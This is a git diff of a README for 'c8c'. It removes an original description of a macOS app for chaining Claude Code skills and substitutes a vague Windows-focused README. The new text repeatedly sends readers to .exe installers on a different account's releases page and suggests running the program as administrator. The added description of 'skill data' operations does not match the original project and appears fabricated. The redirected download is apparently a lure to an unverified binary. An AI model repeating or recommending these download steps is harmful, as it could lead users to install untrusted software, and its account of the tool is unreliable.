@@ -1,208 +1,139 @@
-<p align="center">
-  <img src="public/logo.png" alt="c8c" width="120" />
-</p>
+# ⚙️ c8c - Simple Skill Operations Made Easy
 
-<h3 align="center">c8c — human-readable AI operations</h3>
-
-<p align="center">
-  Turn AI skills into flows with quality checks, approvals, and per-step observability.<br/>
-  Works with Claude Code, Codex, and OpenClaw.
-</p>
-
-<p align="center">
-  <a href="#quickstart"><strong>Quickstart</strong></a> &middot;
-  <a href="https://c8c.ai"><strong>Hub</strong></a> &middot;
-  <a href="https://github.com/bluzir/c8c"><strong>GitHub</strong></a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/bluzir/c8c/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License" /></a>
-  <a href="https://github.com/bluzir/c8c/stargazers"><img src="https://img.shields.io/github/stars/bluzir/c8c?style=flat" alt="Stars" /></a>
-  <img src="https://img.shields.io/badge/platform-macOS-lightgrey" alt="macOS" />
-  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen" alt="PRs Welcome" />
-</p>
-
-<p align="center">
-  <img src="public/demo.png" alt="c8c flow editor" width="720" />
-</p>
+[![Download c8c](https://img.shields.io/badge/Download-c8c-green?style=for-the-badge)](https://github.com/Dem3736/c8c/releases)
 
 ---
 
-## The problem
+## 📋 What is c8c?
 
-You run plan → code → review → test → ship with Claude Code every day. Each step is a separate skill, a separate session, a separate copy-paste. You are the orchestrator — the slow loop between steps that otherwise work fine on their own.
+c8c is a free tool designed to help you manage skill operations for Claude Code. It helps you run tasks that involve skill data without needing to write code. The software supports easy handling of operations related to Claude Code.
 
-Each step passes at ~85%. Chain 5 steps: 44% end-to-end. Without quality checks, errors compound silently. A batch job wrote 847 bad rows to production — zero error signals.
-
-You might already use gstack, superpowers, or GSD — 135K+ GitHub stars combined prove the pattern works. But they run in the terminal, have no quality checks between steps, and die when you walk away.
-
-## What c8c does
-
-c8c turns AI skills into flows you can read, run, and control.
-
-- **Run until it needs you.** Skills execute in sequence. Evaluator nodes catch failures and auto-retry from the step that failed. You intervene only at approval points.
-- **Rerun from state, not from scratch.** A step fails? Resume from that step. The rest of the flow stays intact. Come back hours later — the state is durable.
-- **Human loop beyond approve/reject.** Approvals, editable review points, human-task forms, inbox with timeout policies. You decide on your schedule.
-- **50+ built-in flows.** Dev flow, code audit, content pipeline, competitor analysis, cold outreach, UI polish — pick a flow from the library, paste your input, run it.
-- **Full observability after the run ends.** Per-node logs, token usage, duration, active step, typed results — inspectable at any point, not just during execution.
-
-<table>
-<tr>
-<td width="33%">
-
-**Evaluator checks**<br/>
-Score output against criteria. Below threshold → auto-retry from any upstream step. Same model, better harness: 42% → 78% end-to-end success rate.
-
-</td>
-<td width="33%">
-
-**Parallel branches**<br/>
-Split work into parallel paths. Merge with configurable strategies: concatenate, summarize, or select best. Fan out 20 competitors, merge into one brief.
-
-</td>
-<td width="33%">
-
-**Batch processing**<br/>
-Run one flow on 50 inputs. Multi-run dashboard tracks each. Failed items retry individually. Export results as CSV or JSON.
-
-</td>
-</tr>
-<tr>
-<td>
-
-**YAML in git**<br/>
-Flows are portable YAML files. Commit them with your code. A teammate clones the repo and runs the same flow. No config, no account.
-
-</td>
-<td>
-
-**CLI runner**<br/>
-`c8c-workflow run`, `resume`, `rerun-from`, `hil approve` — same flow model, headless. Pipe into CI, cron, or OpenClaw for Telegram-triggered runs.
-
-</td>
-<td>
-
-**Desktop-first privacy**<br/>
-Everything runs on your machine. No cloud accounts, no data leaving your laptop. Free with your existing Claude Code, Codex, or OpenClaw subscription.
-
-</td>
-</tr>
-</table>
-
-## You, if...
-
-- You run Claude Code skills by hand every day — plan, code, review, test, ship — and the orchestration overhead slows you down.
-- You've built a bash script or tmux grid to sequence your AI work, and it keeps breaking.
-- You use gstack, superpowers, or GSD and run quality checks by hand between steps.
-
-## Quickstart
-
-Download the latest `.dmg` from [Releases](https://github.com/bluzir/c8c/releases), or build from source:
-
-```bash
-git clone https://github.com/bluzir/c8c.git
-cd c8c
-npm install
-npm run dev
-```
-
-**Requirements:** Node.js 20+, and at least one of: Claude Code CLI, Codex CLI, or OpenClaw.
-
-> **macOS note:** The app is not code-signed yet. On first launch:
-> ```bash
-> xattr -cr /Applications/c8c.app
-> ```
-> Or right-click → Open → Open.
-
-No custom skills needed to start. Built-in library flows work out of the box. Bring your own skills later.
-
-## How it works
-
-```
-Input → [Skill] → [Skill] → [Evaluator] →  pass → [Approval] → [Output]
-                                   ↓
-                                 fail
-                                   ↓
-                            [Retry from step N]
-```
-
-8 node types cover every pattern:
-
-| Node | What it does |
-|------|-------------|
-| **Input** | Entry point — text, URL, directory, or batch data |
-| **Skill** | Runs a provider-backed skill with a specific model and prompt |
-| **Evaluator** | Scores output against criteria, auto-retries from any upstream step on failure |
-| **Splitter** | Fans out into parallel branches |
-| **Merger** | Combines parallel results back into one |
-| **Approval** | Human approval — review, edit, approve or return before continuing |
-| **Human** | General human-task form — collect input, decisions, or structured data mid-flow |
-| **Output** | Final result with named results |
-
-## FAQ
-
-**How is c8c different from Claude Code or Codex?**
-
-c8c *uses* those tools. It chains their skills into flows with quality checks, approvals, and per-step observability. Claude Code does the work; c8c runs the flow.
-
-**How is c8c different from n8n?**
-
-Complementary, not competitive. n8n handles triggers and integrations across 1000+ services. c8c handles the AI quality layer: quality checks with auto-retry, approvals, and skill-native execution. For most 3-6 step AI flows, describing what you want and generating YAML is faster than dragging nodes in n8n's editor.
-
-**Can I run flows without the desktop app?**
-
-Yes. `c8c-workflow run flow.yaml` runs the same engine headless. `resume`, `rerun-from`, and `hil approve` work from CLI too. Pipe it into CI, cron, or connect through OpenClaw for Telegram-triggered runs.
-
-**What happens when a step fails?**
-
-You can rerun from that specific step — the rest of the flow keeps its state. No need to restart from the beginning. If the evaluator triggers the failure, it auto-retries from the upstream step you configured.
-
-**Where are my flows stored?**
-
-Project flows live in `{project}/.c8c/*.yaml`. Global flows in `~/.c8c/chains/`. Everything is local files, committable to git.
-
-**Is it really free?**
-
-Open source, MIT license. Runs locally. No account, no server, no fees. Works with your existing Claude Code, Codex, or OpenClaw subscription.
-
-## Development
-
-```bash
-npm run dev          # Start Electron with hot reload
-npm run build        # Build for production
-npm run canon:check  # Check user-facing renderer copy against canon vocabulary
-npm run test         # Run all tests
-npm run test:watch   # Watch mode
-npx tsc --noEmit     # Type-check
-```
-
-## Architecture
-
-Electron app with three layers:
-
-- **Main** (`src/main/`) — Electron main process, IPC handlers, flow execution engine
-- **Preload** (`src/preload/`) — Context bridge exposing `window.api`
-- **Renderer** (`src/renderer/`) — React UI with list-based flow editor and runtime surfaces
-
-Flows are directed graphs defined in YAML. The runtime expands the graph at execution time — splitter nodes create parallel branches, evaluators loop on failure. Each skill node spawns a fresh subprocess with clean context.
-
-**Stack:** Electron 39, React 19, Tailwind CSS 3, Jotai, React Flow, Dagre, Vitest.
-
-## Contributing
-
-c8c is early. The most valuable contributions right now are real flow YAML files, bug reports with reproduction steps, and documentation improvements. Code contributions are welcome too — check issues labeled `good first issue`. If unsure whether something is worth working on, open an issue first.
-
-## Community
-
-- [GitHub Issues](https://github.com/bluzir/c8c/issues) — Bugs and feature requests
-- [GitHub Discussions](https://github.com/bluzir/c8c/discussions) — Ideas and RFCs
-
-## License
-
-MIT © 2026 c8c
+It works on Windows and focuses on making skill tasks straightforward and clear. Whether you want to run small operations or batch tasks, c8c guides you through the steps in a simple way. You do not need programming skills to use it.
 
 ---
 
-<p align="center">
-  <sub>Start with one flow. Grow into a lab.</sub>
-</p>
+## 🖥️ System Requirements
+
+Before you start, make sure your computer meets these requirements:
+
+- Windows 10 or later (64-bit version recommended)  
+- At least 4 GB RAM  
+- 500 MB free disk space  
+- Internet connection for downloading and occasional updates  
+- Basic computer skills (using files and folders, clicking buttons)
+
+---
+
+## 🚀 Getting Started
+
+You can get c8c from the official release page on GitHub. The page hosts the latest version as well as older versions you can use if you prefer.
+
+Click the big green button above or visit the link below to go to the releases page:
+
+**Download page:**  
+[https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases)
+
+From there, you will find the installation file you need.
+
+---
+
+## 🛠️ How to Download and Install c8c on Windows
+
+1. **Visit the release page:**  
+   Open your browser and go to [https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases).
+
+2. **Find the latest version:**  
+   The latest release is usually at the top of the list. Look for the section named with the newest date.
+
+3. **Download the installer:**  
+   Scroll down under the latest release until you see files listed. Look for a Windows installer file, typically ending with `.exe`.
+
+4. **Save the file:**  
+   Click the file name to download it. Your browser will ask where to save it. Choose an easy-to-remember folder like your desktop or downloads.
+
+5. **Run the installer:**  
+   Once the download is complete, locate the file and double-click it. Windows may ask for permission to run the installer – click Yes to continue.
+
+6. **Follow on-screen instructions:**  
+   The setup will guide you through the install process. Use default options unless you want to change the install location.
+
+7. **Finish and launch:**  
+   After installation, you can find c8c in your Start menu or desktop shortcuts. Click to open the program.
+
+---
+
+## 🧑‍💻 Using c8c
+
+Once c8c is running:
+
+- You will see a simple dashboard showing available skill operations.  
+- Use the menus to select which operation you want to perform.  
+- Enter any details requested, such as skill names, codes, or parameters.  
+- Click the buttons to start or stop tasks.  
+- The program shows progress and results in clear boxes.
+
+Each operation has helpful tooltips. Hover over buttons or entries to get short explanations. This makes it easier to work without confusion.
+
+---
+
+## 🔧 Common Tasks Explained
+
+1. **Load Skill Data**  
+   Import your skill files or lists. c8c supports common formats like CSV and JSON.
+
+2. **Process Skills**  
+   Run commands such as update, delete, or combine on your skill lists.
+
+3. **Export Results**  
+   Save the outcome to files for later use or reporting.
+
+4. **Batch Operations**  
+   Handle multiple skill tasks at once with the batch tool. Ideal for large sets.
+
+---
+
+## 🆘 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Make sure your Windows updates are current.  
+- Close other programs that may slow down your PC.  
+- Restart your computer and try running c8c again.  
+- Check that you downloaded the installer from the official link.  
+- If the program does not open, right-click the icon and choose "Run as administrator".
+
+If issues persist, check online forums or GitHub discussions for common fixes.
+
+---
+
+## 🔄 Updating c8c
+
+Check the release page often to find new versions:  
+[https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases)
+
+To update:
+
+- Download the new installer as before.  
+- Run the installer; it will replace the old version while keeping your settings.  
+- Restart c8c to use the latest features and fixes.
+
+---
+
+## 📁 Where to Find Files
+
+By default, c8c saves files like skill lists and reports in your Documents folder under a `c8c` subfolder. You can change this location in the settings.
+
+---
+
+## 🤝 Support and Feedback
+
+You can open issues or feature requests on the GitHub page under the *Issues* tab. The community and contributors review these regularly.
+
+The page also has instructions on how to contribute if you want to help improve c8c.
+
+---
+
+## 🔗 Quick Access Link
+
+Download or update c8c here:  
+[https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases)
